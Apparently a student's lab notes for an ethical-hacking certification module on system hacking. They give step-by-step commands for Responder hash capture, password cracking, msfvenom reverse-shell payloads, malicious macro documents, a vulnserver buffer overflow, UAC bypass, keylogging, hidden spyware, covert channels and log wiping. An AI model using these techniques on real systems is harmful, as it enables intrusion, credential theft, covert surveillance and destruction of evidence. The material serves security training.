# Module 06 - System Hacking #
The four steps in system hacking are:
1. Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system.
2. Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges.
3. Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding or tampering with sensitive file systems.
4. Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.


## Gain Access to the System ##

### Active Online Attack to Crack System Passwords ###
LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OS that are used to perform name resolution for hosts present on the same link. These services are enabled by default in Windows OS and can be used to extract password hashes from a user. By listening to LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be a legitimate server. After the victim system accepts the connection, it is possible to gain the victim's user-credentials.

#### Responder ####
It can be downloaded at: `git clone https://github.com/SpiderLabs/Responder`. Or in Windows at: `Module 06 System Hacking\GitHub Tools\`.

1. On the attacker machine: ``` responder -I <Interface - Ex. eth0> ``` (or ```sudo ./Responder.py -I <Interface> ```)
2. On the victim machine: <kbd>Windows Key + R</kbd> > ```\\ceh-tools``` -> Will return a permission denied message, this is a spoofed message from 'Responder'
3. Return to the attacker machine, and 'Responder' will have captured data about the victim machine and user. To view the log files: ``` /usr/share/responder/logs/ ```. Inside the logs folder, there's a file with the hashes of the users with a name similar to: ``` SMBv2-NTLMv2-SSP-<IP>.txt ```

#### John The Ripper ####
``` john <Path to File>/<Hashes File> ``` (```sudo john /usr/share/responder/logs/SMBv2-NTLMv2-SSP-<IP>.txt ```) - To crack the captured passwords


### Dumping and Cracking SAM Hashes to Extract Plaintext Passwords ###
1. ``` cmd ``` > Run as Administrator
2. ``` wmic useraccount get name,sid ```
   * Administrator -> XXX-500
   * Guest -> XXX-501
  
#### pwdump7 ####
``` PwDump7.exe > hashes.txt ``` - To dump the result into a file

Then, if any user account names are missing, complete them looking at the result of the '*wmic*' command.
 
#### ophcrack ####
1. Load > From a PWDUMP file > Select the 'hashes.txt' file
2. Tables > Select the table 'Vista free' > Set the table directory to '_ophcrack\tables_vista_free\_'
3. Crack


### Creating and Using Rainbow Tables ###
#### Winrtgen ####
1. Add Table
   * Hash -> 'ntlm'
   * Min Len -> 4
   * Max Len -> 6
   * Chain Count -> 4000000
   * Charset -> 'loweralpha' (Depends on the password)
2. 'Ok' -> It will generate the Rainbow Table

#### Rainbow Crack ####
1. File > Load NTLM Hashes from PWDUMP File... > Select the 'hashes.txt' file
2. Rainbow Table > Search Rainbow Table... > Select the generated Rainbow Table


### Auditing System Passwords ###
#### L0phtCrack ####
It can be found at: `Module 06 System Hacking\Password Cracking Tools\`.

0. 'Password Auditing Wizard'
1. Target System Type: Windows(/Unix-Like)
2. Windows Import: Remote Machine (Local Machine, File Generated by PwDump)
3. Windows Import from Remote Machine (SMB): Host - Use Specific User Credentials
4. Choose Audit Type: Strong Password Audit (Quick PA, Common PA, Thorough PA)


### Find Vulnerabilities on Exploit Sites ###
* Exploit Database (https://www.exploit-db.com/)
* SecurityFocus (https://www.securityfocus.com)
* VulnDB (https://vulndb.com)
* Mitre CVE (https://cve.mitre.org)
* Vulners (https://vulners.com)
* CIRCL CVE Search (https://cve.circl.lu)


### Exploiting Client Side Vulnerabilities and Establishing a VNC Session ###
#### msfvenom ####
``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<Attacker Listener IP - Ex. 10.10.10.11> LPORT=<Attacker Open Listener Port - Ex. 444> -o <Output File - Ex. /root/Desktop/reverse-test.exe> ``` - Creating an exploit: Reverse TCP shell malicious _exe_ file

#### Creating a Directory to Share with the Victim ####
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/Desktop/reverse-test.exe /var/www/html/share ``` - Moving the malicious file to the shared folder

#### Starting the Apache Server ####
``` service apache2 start ```

#### Metasploit ####
``` msfconsole ```

Steps to set up a listener:
1. ``` use multi/handler ```
2. ``` set payload windows/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker Listener IP> ```
4. ``` set LPORT <Attacker Listener Port> ```
5. ``` exploit ```

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```reverse-test.exe``` file.

#### Metasploit / Meterpreter ####
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.

#### Find Misconfigurations in the Target System ####
1. On another tab: `git clone https://github.com/PowerShellMafia/PowerSploit`. Or in Windows at: `Module 06 System Hacking\GitHub Tools\`.
2. On the Meterpreter tab: `upload <path>/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1`
3. `shell` - To open a shell session
4. `powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks` - To run PowerUp and perform quick checks against the Windows machine for any privilege escalation opportunities.

#### Establish a VNC Connection ####
1. ` run vnc ` - To start a VNC session with the victim. VNC (Virtual Network Computing) enables an attacker to remotely access and control the targeted computer. At the same time, VNC is also used by network administrators and organizations throughout every industry sector for a range of different scenarios and users.
2. The victim's Desktop screen will appear


### Armitage (to gain access to a remote system) ###
Armitage is a scriptable Red Team collaboration tool for Metasploit that visualizes targets, recommends exploits and exposes the advanced post-exploitation features in the framework. It is (kind of) similar to Cobalt Strike.

1. (`sudo su`) > `service postgresql start`
2. Applications > Pentesting > Exploitation Tools > Metasploit Framework > Armitage
3. Connect, Start Metasploit? > Yes
4. Scan the Target: 'Hosts' > 'Nmap Scan' > 'Intense Scan'
5. Generate and Send a Payload: 'Payload' > 'Windows' > 'Meterpreter' > 'meterpreter_reverse_tcp'. Set the LHOST and LPORT values.
6. Share the File: `cp <path>/malicious_payload.exe` , `service apache2 start`
7. Download it from the victim machine, in Armitage the icon of the victim will change, so the session has opened successfully.
8. Right click on the victim > 'Meterpreter 1' > 'Interact' > 'Meterpreter Shell', or 'Explore' > 'Browse Files'/'Screenshot'/'Log Keystrokes', or 'Escalate Privileges' to steal tokens, dump hashes...


### Hacking Windows Server 2012 with a Malicious Office Document ###
#### TheFatRat ####
TheFatRat is an exploitation tool that compiles malware with a popular payload that can then be executed on Windows, Android and Mac OSs. It offers an easy way to create backdoors and payloads that can bypass most anti-viruses.

It can be found at: `git clone https://github.com/Streetsec/TheFatRat`. Or in Windows at: `Module 06 System Hacking\GitHub Tools\`.

0. `./setup.sh` > Option: '2' (Install Searchsploit from Kali Repository), 'y' (Run fatrat from anywhere) > ``` fatrat ```
1. ``` [06] Create Fud Backdoor 1000% with PwnWinds [Excelent] ```
2. ``` [3] Create exe file with apache + Powershell ```
3. ``` Set LHOST IP: <Attacker IP> ```, ``` Set LPORT: <Attacker Port> ```
4. ``` payload ``` > ``` [3] windows/meterpreter/reverse_tcp ```
5. ``` [8] Back to Menu ```
6. ``` [07]Â Create Backdoor for Office with Microsploit ```
7. ``` [2] The Microsoft Office Macro on Windows ```
8. ``` Set LHOST IP: <Attacker IP> ```, ``` Set LPORT IP: <Attacker Port> ```, ``` Enter basename for output files: BadDoc ```, Document Body as default, ``` Are u Want to Use custom exe file backdoor (y/n): y ```, 
9. ```Enter the path to the exe file: <Path>/output/payload.exe ```  > ``` [3] windows/meterpreter/reverse_tcp ```

#### Creating a Directory to Share with the Victim ####
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/TheFatRat/Output/BadDoc.docm /var/www/html/share ``` - Moving the malicious file to the shared folder

#### Starting the Apache Server ####
``` service apache2 start ```

#### Metasploit ####
``` msfconsole ```

1. ``` use exploit/multi/handler ```
2. ``` set payload windows/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker IP> ```
4. ``` show options ```
5. ``` exploit -j -z ```

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```BadDoc.docm``` file.

#### Metasploit / Meterpreter ####
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.


### Buffer Overflow (to gain access to a remote system) ###
#### VulnServer ####
It can be found at: `Module 06 System Hacking\Buffer Overflow Tools\`. (Run it as administrator)

#### Immunity Debugger ####
It can be found at: `Module 06 System Hacking\Buffer Overflow Tools\`. (Run it as administrator)

'File' > 'Attach' > 'vulnserver' > 'Run Program' (Play icon)

#### Perform Spiking ####
1. From the Parrot machine: `nc -nv <Target IP> <port>` > 'HELP' >'EXIT'
2. Create a Spike template: `vim stats.spk`:
    ```
      s_readline();
      s_string("STATS");
      s_string_variable("0");
    ```
3. Back in the terminal: `generic_send_tcp <Target IP> <Port> stats.spk 0 0` (0s are the values for SKIPVAR and SKIPSTR)
4. Now in the Immunity Debugger, we can observe that the 'STATS' function is *not* vulnerable to Buffer Overflow. Let's do the same process with the 'TRUN' function.
5. Create a Spike template: `vim trun.spk`:
    ```
      s_readline();
      s_string("TRUN ");
      s_string_variable("0");
    ```
6. Back in the terminal: `generic_send_tcp <Target IP> <Port> trun.spk 0 0` (0s are the values for SKIPVAR and SKIPSTR)
7. Now in the Immunity Debugger, we can observe that the 'TRUN' function status changed to 'Paused' which indicates that the 'TRUN' function has a Buffer Overflow vulnerability. Spiking the 'TRUN' function has overwritten stack registers such as 'EAX', 'ESP', 'EBP' and 'EIP'.
8. Close Immunity Debugger and the 'vulnserver' process.

#### Perform Fuzzing ####
1. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger. And click the 'Run Program' icon.
2. Copy to the Parrot machine the folder: `Module 06 System Hacking\Buffer Overflow Tools\Scripts`.
3. Give it permissions and run it: `./fuzz.py`.
4. Now, switch to the Immunity Debugger and wait for the status to change from 'Running' to 'Paused'.
5. Switch back to the Parrot machine and terminate the Python script (ctrl+c). A message appears, saying that the vulnerable server crashed after receiving aprox. X bytes of data, but it did not overwrite the EIP register.
6. Close Immunity Debugger and the 'vulnserver' process.

#### Identify the Offset ####
1. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger. And click the 'Run Program' icon.
2. In the Parrot machine: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l Y` Where Y is the next even (par) number after where the previous fuzzing step sttoped working (X). (Ex. if X was 3300, Y is 3400).
3. Copy the result and paste it into the 'offset' value of `vim findoff.py`.
4. Give it permissions and run it `./findoff.py`.
5. Switch back to the Immunity Debugger and observe that the EIP register is overwritten with random bytes.
6. Switch back to Parrot: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l Y -q <New EIP Register value found at the previous step>`
7. Close Immunity Debugger and the 'vulnserver' process.

#### Overwrite the EIP Register ####
1. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger. And click the 'Run Program' icon.
2. Give permissions and run `./overwrite.py`.
3. Now in the Immunity Debugger we can see that the EIP register can be controlled and overwritten with malicious shellcode.
4. Close Immunity Debugger and the 'vulnserver' process.

#### Identify Bad Characters before Injecting Shellcode into the EIP Register ####
1. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger. And click the 'Run Program' icon.
2. Give permissions and run `./badchars.py`.
3. Switch to Immunity Debugger > Right click on the ESP register value on the top right window > 'Follow in Dump'. We can see that there are no bad chars.
4. Close Immunity Debugger and the 'vulnserver' process.

#### Identify the Right Module ####
1. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger. And click the 'Run Program' icon.
2. Copy the script `Module 06 System Hacking\Buffer Overflow Tools\Scripts\mona.py` to `C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands`.
3. Switch to Immunity Debugger and type `!mona modules`. We can see that there is no memory protection for the module 'essfunc.dll'.
4. Back in the Parrot machine: `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` > `JMP ESP`. It will give the hex code value, let's call it 'XYZW'.
5. Switch to Immunity Debugger and type `!mona find -s "\xXY\xZW" -m essfunc.dll`. In the 'Results' section of the output, the first 0xABCDEFGH value is the return address of the variable.
6. Close Immunity Debugger and the 'vulnserver' process.
7. Relaunch as administrator both the 'vulnserver' process and Immunity Debugger.
8. Select the 'Go to address in Disassembler' icon (Purple with right arrow) > Enter the ABCDEFGH value > Press 'F2' to set a breakpoint in the selected address.
9. Click the 'Run Program' icon.
10. In the Parrot machine, give permissions and run `./jump.py`.
11. Switch to Immunity Debugger and you will observe that the EIP register has been overwritten with the return address of the vulnerable module.
12. Close Immunity Debugger and the 'vulnserver' process.
13. Relaunch the 'vulnserver' process.

#### Generate the Shellcode ####
1. In the Parrot machine: `msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP> LPORT=<Listening Port> EXITFUNC=thread -f -c -a x86 -b "\x00"`. Copy the result and paste it into the 'overflow' value of the file: `vim shellcode.py`.
2. `nc -nvlp <Listening Port>`
3. Give permissions and run `./shellcode.py`.
4. Now in the Netcat terminal tab a reverse session will have started from the Windows machine.


[//]: <> (- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -)

## Perform Privilege Escalation ##

### Privilege Escalation Tools and Client-Side Vulnerabilities ###

### Escalating Privileges by Exploiting Client Side Vulnerabilities ###
#### msfvenom ####
``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<Attacker IP> -f exe > <Output Path - Ex. desktop>/exploit.exe ```

#### Creating a Directory to Share with the Victim ####
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/desktop/exploit.exe /var/www/html/share ``` - Moving the malicious file to the shared folder

#### Starting the Apache Server ####
``` service apache2 start ```

#### Metasploit ####
``` msfconsole ```

1. ``` use exploit/multi/handler ```
2. ``` set payload windows/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker IP> ```
4. ``` exploit -j -z ```

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```exploit.exe``` file.

#### Metasploit / Meterpreter ####
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.

1. ``` getuid ``` - To check we are logged into the victim machine
2. ``` run post/windows/gather/smart_hashdump ``` - To dump the password hashes. It might fail due to insufficient privileges.
3. ``` getsystem -t 1 ``` - Tries to escalate privileges by trying to bypass the user account control setting. It uses the 'Service - Name Pipe Impersonation (In Memory/Admin)' technique. It might fail.
4. ``` background ``` - To set the session on the background
5. ``` use exploit/windows/local/bypassuac_fodhelper ``` -> ``` show options ``` - Exploit to bypass User Access Controls
6. ``` set SESSION 1 ``` - Now the exploit has been configured. Now we will configure a payload
7. ``` set payload windows/meterpreter/reverse_tcp ``` -> ``` show options ```
8. ``` set LHOST <Attacker IP> ``` , ``` set TARGET 0 ``` - Target 0 is Windows x86
9. ``` exploit ```
10. ``` getuid ``` , ``` getsystem ``` - Now it successfully escalates privileges (``` getuid``` -> NT AUTHORITY\SYSTEM)
11. ``` run post/windows/gather/smart_hashdump ``` - Now it dumps the LM/NTLM password hashes.

#### BeRoot ####
It allows you to run a configuration assessment on a target system to find information about the underlying vulnerabilities of system resources such as services, file and directory permissions, kernel version and architecture. Using this information, you can find a way to further exploit and elevate privileges on the target system.

It can be found at: `Module 06 System Hacking\Privilege Escalation Tools\`.

1. Copy it to the Parrot machine.
2. In the meterpreter tab: `upload <path>/beRoot.exe` > `shell` > `beRoot.exe`

#### Other Privilege Escalation Tools ####
* linpostexp


### Hacking Windows 10 using Metasploit and Post-Exploitation using Meterpreter ###
#### Creating a File ####
Creating the file ```secret.txt``` with confidential information: ```My Credit Card account number is 123456789```.

#### msfvenom ####
``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<Attacker IP> -f exe > <Output Path - Ex. desktop>/backdoor.exe ```

#### Creating a Directory to Share with the Victim ####
1. ``` mkdir /var/www/html/share ```
2. ``` chmod -R 755 /var/www/html/share ```
3. ``` chown -R www-data:www-data /var/www/html/share ```
4. ``` mv /root/desktop/backdoor.exe /var/www/html/share ``` - Moving the malicious file to the shared folder

#### Starting the Apache Server ####
``` service apache2 start ```

#### Metasploit ####
``` msfconsole ```

1. ``` use exploit/multi/handler ```
2. ``` set payload windows/meterpreter/reverse_tcp ```
3. ``` set LHOST <Attacker IP> ```
4. ``` show options ```
5. ``` exploit -j -z ```

#### Luring the Victim ####
Now, the attacker should lure the victim to access: ```http://<Attacker IP>/share``` and download and execute the ```backdoor.exe``` file.

#### Metasploit / Meterpreter ####
If Meterpreter does not start automatically interacting with the victim, type: ``` sessions -i 1 ```.

1. ``` sysinfo ``` - Information about the system
2. ``` ipconfig ``` - Networking Interfaces information
3. ``` getuid ``` - User privilege information
4. ``` pwd ``` - Current working directory
5. ``` ls ```
6. ``` cat secret.txt ``` - The secret file can be read
7. ``` timestomp secret.txt ``` - To view the MACE (Modified, Access, Created, Entry Modified) Date+Time attributes of the file
8. ``` download secret.txt ``` - The file is downloaded to the attacker system
9. ``` cd C:\ ``` -> ``` search -f "filename" ``` - To search for the file in the current directory
10. ``` keyscan_start ``` - Starts capturing keystrokes on the victim system
11. ``` keyscan_dump ``` - Dumps the captured keystrokes
12. ``` idletime ``` - Checks the IDLE time of the machine
13. ``` shutdown ``` - Shuts down the machine


[//]: <> (- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -)

## Maintain Remote Access and Hide Malicious Activities ##

### User System Monitoring and SurveillanceÂ ###
#### Spytech SpyAgent ####
Connect to the victim via RDP and follow all the steps to install the software. It will run as 'Stealth Mode' (Hidden). If we want to access it: ``` Ctrl+Shift+Alt+M ``` and type the password.

It records a great amount of information, such as keystrokes, programs used, screenshots, mic and webcam..., and organizes it via applications, users, window title... It can be found at: `Module 06 System Hacking\General Spyware\`.

### Web Activity Monitoring and RecordingÂ ###
#### Power Spy ####
Connect to the victim via RDP and follow all the steps to install the software. Click on 'Start Monitoring' and 'Stealth Mode' to run it on the background. If we want to access it: ``` Ctrl+Alt+X ``` and type the password.

It records a great amount of information, such as keystrokes, clipboard, screenshots, mic, emails..., and organizes it via applications, users, window title... It can be found at: `Module 06 System Hacking\General Spyware\`.

### Other Spyware Tools ###
* ACTIVTrak (https://activtrak.com)
* Veriato Cerebral (https://www.veriato.com)
* NetVizor (https://netvizor.net)
* SoftActivity Monitor (https://www.softactivity.com)

### Hiding Files using NTFS Streams ###
1. ``` type calc.exe > readme.txt:calc.exe ```
2. ``` mklink backdoor.exe readme.txt:calc.exe ```
3. ``` backdoor.exe ``` -> Will execute _calc.exe_

### Hiding Data using White Space Steganography ###
#### Snow ####
Snow is a program that conveals messages in text files by appending tabs and spaces to the end of lines, and that extracts hidden messages from files containing them. Move to the 'Snow' folder in the _cmd_. In Windows it can be found at: `Module 06 System Hacking\Steganography Tools\Whitespace Steganography Tools\`.

1. ``` snow -C -m "My bank account number is 123456789" -p <Password - Ex. "magic"> <Input File> <Output File> ``` - The contents of the output file are the contents of the input file + "My bank acount...". This content is hidden within whitespaces and tabs in the output file.
2. ``` snow -C -p "magic" <Previous Output File> ``` - It will show the 'secret' contents of the output file

### Image Steganography ###
#### OpenStego ####
OpenStego is an image steganography tool that hides data inside images. In Windows it can be found at: `Module 06 System Hacking\Steganography Tools\Image Steganography Tools\`.

* Hide Data
    * Message File -> File with sensitive information
    * Cover File -> Image where the information is going to be inserted into
    * Output Stego File -> Select the path and name of the desired output file
* Extract Data
    * Input Stego File 
    * Output Folder for Message File

#### Quick Stego ####
* Hide Data
  1. Picture, Image, Photo File > Open Image
  2. Text File > Open Text
  3. Steganography > Hide Text
* Extract Data
  1. Picture, Image, Photo File > Open Image
  2. Steganography > Get Text

#### Other Image Steganography Tools ####
* SSutie Picsel (https://www.ssuitesoft.com)
* CryptaPix (https://www.briggsoft.com)
* gifshuffle (http://www.darkside.com)

### Create Covert Channels ###
Networks use network access control permissions to permit or deny the traffic flowing through them. Tunneling is used to bypass the access control rules of firewalls, IDS, IPS and web proxies to allow certain traffic. Covert channels can be created by inserting data into the unused fields of protocol headers.

#### Covert_TCP ####
1. ``` cd desktop ```
2. ``` mkdir send ```
3. ``` cd send/ ```
4. ``` echo "Secret Message" > message.txt ```
5. Files > + Other Locations > Connect to Server: ``` smb://<Server IP> ```
6. Navigate to: ```E$\CEHv10 Module 06 System Hacking\Covert_TCP ``` > Right-click _covert_tcp.c_ > Choose: 'Copy'
7. Paste it into the folder 'send' in the local machine
8. ```cc -o covert_tcp covert_tcp.c ```
9. Log into another machine > ``` cd desktop ``` , ``` mkdir receive ```, ``` cd receive ```
10. Files > + Other Locations > Connect to Server: ``` smb://<Server IP> ```
11. Navigate to: ```E$\CEHv10 Module 06 System Hacking\Covert_TCP ``` > Right-click _covert_tcp.c_ > Choose: 'Copy'
12. Paste it into the folder 'receive' in the local machine
13. ```cc -o covert_tcp covert_tcp.c ```
14. ``` sudo su ```, ``` ./covert_tcp -dest <IP Dest> -source_port <Port A> -dest_port <Port B> -server -file <Path>/receive/receive.txt ```
15. Return to the original machine and launch 'Wireshark'
16. ``` ./covert_tcp -dest <IP Dest> -source <IP Source> -source_port <Port B> -dest_port <Port A> -file <Path>/send/message.txt ```

*Check because I think the IPs are wrong*


[//]: <> (- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -)

## Clear Logs to Hide Evidence of Compromise ##
To remain undetected, the intruders need to erase all evidence of security compromise from the system. Various techniques are used to clear the evidence of security compromise:

* Disable Auditing Features
* Clearing and/or Manipulating Logs
* Covering Tracks on the Network (HTTP shells, reverse ICMP tunnels, DNS tunneling and TCP parameters)
* Covering Tracks on the OS (NTFS streams)
* Deleting Files (tools like _cipher.exe_)
* Disabling Windows Functionality (Disable last access timestamp, Hibernation, virtual memory and system restore points)

### Viewing, Enabling and Clearing Audit Policies ###
#### Auditpol ####
1. ``` cd C:\Windows\system32 ```
2. ``` auditpol.exe /get /category:* ``` - To view all Audit Policies
3. ``` auditpol /set /category:"system","account logon" /success:enable /failure:enable ```- To enable the Audit Policies
4. ``` auditpol /clear /y ``` - To clear the Audit Policies

### Clear Windows Machine Logs ###
#### Clear_Event_Viewer_Logs.bat ####
It can be found at: `Module 06 System Hacking\Covering Tracks Tools\`. Run it as administrator.

#### wevtutil ####
Run `cmd` as administrator.  

* `wevtutil el` - To display a list of event logs
* `wevtutil el | enum-logs` - To list event log names
* `wevtutil cl <log_name>` - To clear a specific event log

#### Cipher ####
Run `cmd` as administrator.  

* `cipher /w:<Drive or Folder location>` - To overwrite deleted files in a specific drive or folder.

#### CCleaner ####
CCleaner is a system optimization, privacy and cleaning tool. It allows you to remove unused files and cleans traces of Internet browsing details from the target PC. It can be found at: `Module 06 System Hacking\Covering Tracks Tools\`.

'Run' > 'Easy Clean' / 'Custom Clean' > 'Analyze'

#### Other Track-Covering Tools ####
* DBAN (https://dban.org)
* Privacy Eraser (https://www.cybertronsoft.com)
* Wipe (https://privacyroot.com)
* BleachBit (https://www.bleachbit.org)

### Clear Linux Machine Logs ###
#### BASH Shell ####
* `export HISTSIZE=0` 
* `history -c` - To clear the stored history
* `history -w` - To delete the history of the current shell
* `shred ~/.bash_history` - To shred the history file, making its content unreadable
* `shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit` - To use the above commands in a single line
